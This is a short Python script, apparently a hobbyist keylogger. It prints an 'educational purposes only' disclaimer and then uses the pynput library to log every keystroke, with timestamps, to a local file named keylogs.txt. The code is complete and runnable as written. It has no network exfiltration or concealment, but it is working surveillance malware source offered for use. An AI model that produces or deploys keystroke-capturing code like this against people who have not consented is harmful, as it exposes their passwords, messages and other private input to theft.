print("""
A Python Keylogger created by Shuvadip Ghosh
This for Educational purposes only
Person using it for malicious purposes will only be responsible for the consequenses and no one else.
""")
from pynput.keyboard import Key, Listener
import logging
logging_dir = ""
logging.basicConfig(filename=(logging_dir+"keylogs.txt"),level= logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(Key):
    logging.info(str(Key))

with Listener(on_press = on_press) as listener:
    listener.join()
